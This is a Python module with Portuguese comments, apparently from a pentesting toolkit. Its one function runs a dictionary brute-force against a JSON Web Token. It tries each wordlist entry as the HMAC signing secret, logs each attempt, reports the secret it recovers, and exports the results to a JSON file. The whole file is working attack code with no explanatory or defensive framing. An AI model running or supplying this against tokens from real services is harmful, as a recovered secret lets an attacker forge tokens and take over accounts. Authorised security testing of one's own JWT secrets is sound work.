import os
import time
import json
import datetime
import logging

import jwt
from jwt import InvalidTokenError


def run_jwt_bruteforce(token: str, wordlist_path: str, algorithm: str, log_callback, finished_callback):
    """
    Execute brute-force attack to discover JWT secret.
    token: JWT string
    wordlist_path: path to wordlist file
    algorithm: JWT signing algorithm (e.g. HS256)
    log_callback(msg): callback for log messages
    finished_callback(result): callback when done with result dict
    """
    start_time = time.time()
    log_callback("Iniciando brute-force de JWT...")
    # Validação inicial
    parts = token.split('.')
    if len(parts) != 3:
        finished_callback({
            'status': 'error',
            'error': 'Token JWT inválido',
            'secret': None,
            'attempts': 0,
            'time': 0
        })
        return
    if not os.path.isfile(wordlist_path):
        finished_callback({
            'status': 'error',
            'error': 'Wordlist não encontrada',
            'secret': None,
            'attempts': 0,
            'time': 0
        })
        return
    attempts = 0
    secret_found = None
    # Leitura da wordlist
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        finished_callback({
            'status': 'error',
            'error': f'Falha ao ler wordlist: {e}',
            'secret': None,
            'attempts': 0,
            'time': 0
        })
        return
    # Execução do ataque
    for secret in lines:
        attempts += 1
        log_callback(f"Testando chave: {secret}...")
        try:
            jwt.decode(token, secret, algorithms=[algorithm])
            secret_found = secret
            log_callback(f"✅ Sucesso! Segredo encontrado: {secret}")
            break
        except InvalidTokenError:
            continue
        except Exception as e:
            log_callback(f"Erro ao testar '{secret}': {e}")
            continue
    elapsed = time.time() - start_time
    status = 'success' if secret_found else 'not_found'
    result = {
        'status': status,
        'secret': secret_found,
        'attempts': attempts,
        'time': round(elapsed, 2)
    }
    # Exportar resultados
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    out_dir = os.path.join('output', 'jwt_bruteforce_results')
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, f'jwt_bruteforce_{timestamp}.json')
    try:
        with open(out_path, 'w', encoding='utf-8') as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        log_callback(f"Resultados exportados em {out_path}")
    except Exception as e:
        log_callback(f"Falha ao salvar resultados: {e}")
    finished_callback(result) 